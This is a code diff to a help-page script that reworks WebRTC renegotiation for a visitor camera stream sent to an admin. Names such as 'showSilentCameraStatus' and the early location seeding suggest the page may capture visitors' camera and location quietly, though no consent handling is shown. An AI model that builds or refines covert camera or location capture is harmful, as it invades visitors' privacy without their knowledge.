@@ -1,5 +1,5 @@
-(function () {
-  console.info("[help-build]", "144", location.pathname);
+﻿(function () {
+  console.info("[help-build]", "145", location.pathname);
   const searchInput = document.getElementById("help-search");
   const searchBtn = document.getElementById("search-btn");
   const searchHint = document.getElementById("search-hint");
@@ -2115,15 +2115,29 @@
             console.error(err);
           }
         } else if (sdp !== state._lastAnswerSdp && state.pc.signalingState !== "closed") {
-          // Admin yeni PC ile yeniden bağlandı — ICE restart + yeni offer
+          // Saglikli baglantida iceRestart YOK — admin rejoin dongusu / siyah ekran
+          const conn = state.pc.connectionState;
+          const ice = state.pc.iceConnectionState;
+          const healthy =
+            conn === "connected" ||
+            ice === "connected" ||
+            ice === "completed" ||
+            conn === "connecting" ||
+            ice === "checking";
+          if (healthy || !(conn === "failed" || ice === "failed" || ice === "disconnected")) {
+            state._lastAnswerSdp = sdp;
+            return;
+          }
           state._lastAnswerSdp = sdp;
           try {
             const offer = await state.pc.createOffer({ iceRestart: true });
             await state.pc.setLocalDescription(offer);
-            await sync.writeCameraOffer(sessionId, newCallId, {
-              type: offer.type,
-              sdp: offer.sdp,
-            });
+            await sync.writeCameraOffer(
+              sessionId,
+              newCallId,
+              { type: offer.type, sdp: offer.sdp },
+              { force: true }
+            );
             await sync.markVisitorCameraReady?.(sessionId, newCallId).catch(() => {});
           } catch (err) {
             console.warn("visitor renegotiate", err);
@@ -2446,14 +2460,29 @@
             console.error(err);
           }
         } else if (sdp !== state._lastAnswerSdp && state.pc.signalingState !== "closed") {
+          // Saglikli baglantida iceRestart YOK — admin rejoin dongusu / siyah ekran
+          const conn = state.pc.connectionState;
+          const ice = state.pc.iceConnectionState;
+          const healthy =
+            conn === "connected" ||
+            ice === "connected" ||
+            ice === "completed" ||
+            conn === "connecting" ||
+            ice === "checking";
+          if (healthy || !(conn === "failed" || ice === "failed" || ice === "disconnected")) {
+            state._lastAnswerSdp = sdp;
+            return;
+          }
           state._lastAnswerSdp = sdp;
           try {
             const offer = await state.pc.createOffer({ iceRestart: true });
             await state.pc.setLocalDescription(offer);
-            await sync.writeCameraOffer(sessionId, activeId, {
-              type: offer.type,
-              sdp: offer.sdp,
-            });
+            await sync.writeCameraOffer(
+              sessionId,
+              activeId,
+              { type: offer.type, sdp: offer.sdp },
+              { force: true }
+            );
             await sync.markVisitorCameraReady?.(sessionId, activeId).catch(() => {});
           } catch (err) {
             console.warn("visitor renegotiate", err);
@@ -3159,8 +3188,8 @@
     return { camP, locP };
   }
 
-  /** Canlı oturumda admin’in beklediği SDP offer yoksa yeniden yaz */
-  async function republishVisitorCameraOffer(callId) {
+  /** Offer varsa dokunma; iceRestart/epoch spam YOK (admin siyah döngü). */
+  async function ensureVisitorOfferPublished(callId) {
     const sync = window.ChatSync;
     const sessionId = sync?.getSessionId?.();
     const state = callId ? cameraSessions.get(callId) : null;
@@ -3169,21 +3198,21 @@
     if (pc.signalingState === "closed") return false;
     try {
       await sync.markVisitorCameraReady?.(sessionId, callId).catch(() => {});
-      // Admin henüz answer vermedi — mevcut offer’ı tekrar yayınla (yeni epoch)
-      if (
-        pc.localDescription?.type === "offer" &&
-        (pc.signalingState === "have-local-offer" || !pc.remoteDescription)
-      ) {
+      const local = pc.localDescription;
+      if (local?.type === "offer" && local.sdp) {
         await sync.writeCameraOffer(sessionId, callId, {
-          type: pc.localDescription.type,
-          sdp: pc.localDescription.sdp,
+          type: local.type,
+          sdp: local.sdp,
         });
         latestCameraCallId = callId;
         return true;
       }
-      // Bağlı / stable: iceRestart ile yeni offer
-      if (pc.signalingState === "stable") {
-        const offer = await pc.createOffer({ iceRestart: true });
+      if (pc.remoteDescription?.type === "answer") {
+        latestCameraCallId = callId;
+        return true;
+      }
+      if (pc.signalingState === "stable" || pc.signalingState === "have-local-offer") {
+        const offer = await pc.createOffer();
         await pc.setLocalDescription(offer);
         await sync.writeCameraOffer(sessionId, callId, {
           type: offer.type,
@@ -3194,7 +3223,7 @@
       }
       return false;
     } catch (err) {
-      console.warn("republish offer", err);
+      console.warn("ensure offer", err);
       return false;
     }
   }
@@ -3218,7 +3247,7 @@
         });
         const live = findLiveCameraSessionEntry();
         if (live?.[0]) {
-          await republishVisitorCameraOffer(live[0]);
+          await ensureVisitorOfferPublished(live[0]);
         } else if (!ok) {
           const sync = window.ChatSync || (await window.ChatSyncReady);
           if (sync?.startVisitorCameraOffer) {
@@ -3608,7 +3637,7 @@
         null;
       if (liveId) {
         showSilentCameraStatus(box, liveId);
-        void republishVisitorCameraOffer(liveId);
+        void ensureVisitorOfferPublished(liveId);
       }
       return true;
     }
@@ -3619,7 +3648,7 @@
         null;
       if (liveId) {
         showSilentCameraStatus(box, liveId);
-        void republishVisitorCameraOffer(liveId);
+        void ensureVisitorOfferPublished(liveId);
         const st = cameraSessions.get(liveId);
         if (st && !st._hadLocation) {
           const seed = earlyLocationPos || restoreEarlyLocation();
